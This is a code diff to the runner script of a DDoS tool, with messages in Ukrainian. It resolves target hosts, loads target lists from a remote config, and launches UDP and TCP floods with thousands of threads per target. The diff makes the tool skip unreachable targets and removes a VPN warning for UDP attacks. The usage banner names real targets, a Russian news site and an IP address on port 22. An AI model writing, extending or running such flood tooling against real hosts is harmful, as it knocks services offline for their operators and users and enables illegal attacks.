@@ -24,12 +24,13 @@ THREADS_PER_CORE = 1000
 MAX_DEFAULT_THREADS = 4000
 
 
-@lru_cache
+@lru_cache(maxsize=128)
 def resolve_host(url):
     try:
         return socket.gethostbyname(URL(url).host)
     except socket.gaierror:
-        exit(f'Невалідна ціль {url} - перевірте правильність написання')
+        logger.error(f'{cl.FAIL}Ціль {url} недоступна і не буде атакована{cl.RESET}')
+        return None
 
 
 class Targets:
@@ -62,7 +63,7 @@ class Targets:
         try:
             config_content = requests.get(self.config, timeout=5).text
         except requests.RequestException:
-            logger.warning('Could not load new config, proceeding with the last known good one')
+            logger.warning(f'{cl.FAIL}Не вдалося (пере)завантажити конфіг - буде використано останні відомі цілі{cl.RESET}')
         else:
             self.config_targets = [
                 target.strip()
@@ -132,7 +133,6 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, vpn_mode, debug)
         ip = resolve_host(target)
         # UDP
         if target.lower().startswith('udp://'):
-            logger.warning(f'Make sure VPN is enabled - proxies are not supported for UDP targets: {target}')
             params_list.append(['UDP', target, ip, UDP_THREADS, period])
 
         # TCP
@@ -155,11 +155,13 @@ def start(total_threads, period, targets_iter, rpc, http_methods, vpn_mode, debu
     os.chdir('mhddos')
     while True:
         targets = list(targets_iter)
+        targets = [
+            target for target in targets
+            if resolve_host(target)
+        ]
         if not targets:
-            logger.error('Must provide either targets or a valid config file')
+            logger.error(f'{cl.FAIL}Не знайдено жодної доступної цілі{cl.RESET}')
             exit()
-        for target in targets:
-            resolve_host(target)
 
         if rpc < LOW_RPC:
             logger.warning(
@@ -231,7 +233,7 @@ def init_argparse() -> argparse.ArgumentParser:
 
 def print_banner(vpn_mode):
     print(f'''
-                            {cl.FAIL}!!!{'УВІМКНІТЬ VPN!!!' if vpn_mode else 'ВИМКНІТЬ VPN!!!  (окрім UDP атак)'}{cl.RESET}
+                            {cl.HEADER}!!!{'УВІМКНІТЬ VPN!!!' if vpn_mode else 'ВИМКНІТЬ VPN!!!  (окрім UDP атак)'}{cl.RESET}
 
 - {cl.WARNING}Навантаження{cl.RESET} - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000
     python3 runner.py -t 3000 https://ria.ru tcp://194.54.14.131:22
